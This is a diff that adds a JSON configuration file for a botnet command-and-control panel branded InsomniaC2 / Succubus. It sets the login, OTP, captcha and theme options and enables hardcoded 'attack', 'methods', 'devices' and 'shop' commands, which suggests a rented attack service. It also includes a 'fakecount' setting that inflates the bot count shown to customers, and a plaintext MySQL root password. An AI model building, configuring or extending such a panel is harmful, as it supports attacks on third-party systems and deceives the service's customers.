@@ -1,0 +1,125 @@
+{
+    "key":"This Key no worky :(",
+
+	"mysql":{
+		"address":"127.0.0.1:3306",
+		"username":"root",
+		"password":"deat18@03",
+		"table":"succubus"
+	},
+
+	"connection":{
+		"port":999
+	},
+
+    "fakecount":{
+        "enabled":false,
+        "port":123,
+        "delay":10,
+        "chance":50,
+        "minimum":1000,
+        "maximum":1300
+    },
+
+    "branding":{
+
+        "title":"<<$botcount>> boats | Succubus Custom Build | Serving <<$username>> | Active Sessions <<$onlineusers>> | <<$expiry>> ",
+	"prompt":"<theme>┌──</>[<theme>InsomniaC2</>]-[~/<theme>succubus</>/<theme>cnc</>/<theme><<$username>></>]\r\n<theme>└───</>➤",
+		
+        "assets":{
+            "welcome":"succ",
+            "banner":"succ",
+	    "attack":"attack"
+        },
+	    
+        "login":{
+            "custom":false,
+            "title":"Welcome to InsomniaC2",
+            "asset":"login",
+
+            "-Comment- Remove this line":"If you don't want your string in here use the include function!",
+
+	    "getuser":"<<include(user)>>",
+            "getpass":"<<include(pass)>>"
+        },
+
+        "tos":{ 
+            "enabled":false,
+            "title":"InsomniaC2 TOS (unused) plopp wanted this lol",
+            "asset":"tos",
+            "prompt":"succubus/tos >",
+            "answer":"i agree"
+        },
+	"otp":{
+	    "-Comment- Remove this line" : "This will force all users to enable otp before using their account!",
+            "enabled":false,
+            "title":"[<<$spinner>>] InsomniaC2 Otp [<<$spinner>>]",
+            "asset":"otp",
+            "prompt":"codeplz> "
+        },
+
+        "errors":{
+            "403":"<theme>403 You Do Not Have Access!</>",
+            "404":"<theme>404 Asset Not Found!</>",
+            "500":"<theme>500 Asset Error!</>"
+        },
+
+        "hardcoded":{
+        
+            "-Comment- Remove this line" : "Removing them will also disable them keep this in mind!",
+    
+            "help":true,
+            "methods":true,
+            "key":true,
+            "tools":true,
+            "devices":true,
+            "theme":true,
+            "attack":true,
+            "chat":true,
+            "shop":true
+        },
+
+        "captcha":{
+            "enabled":false,
+            "title":"[<<$spinner>>] InsomniaC2 Captcha [<<$spinner>>]",
+            "asset":"captcha",
+            "prompt":"captcha> "
+        },
+
+        "misc":{
+            "idle timeout":2600,
+	    "prompt check":false,
+            "lock host":false,
+            "lock timezone":true,
+		
+            "chat cooldown":5,
+
+            "spinner":["<   3","<-  3","< - 3","<  -3"],
+
+            "-Comment- Remove this line": "This is not implemented in free succubus builds",
+            "prompt colors":[
+                {
+                    "r": 255,
+                    "g": 255,
+                    "b": 255
+                }
+
+            ],
+            "invert gradients":false,
+            "gradient":[
+                {
+                    "r": 222,
+                    "g": 3,
+                    "b": 244
+                },
+                {
+                    "r": 0,
+                    "g": 46,
+                    "b": 250
+                }
+                
+            ]
+
+        }
+    }
+}
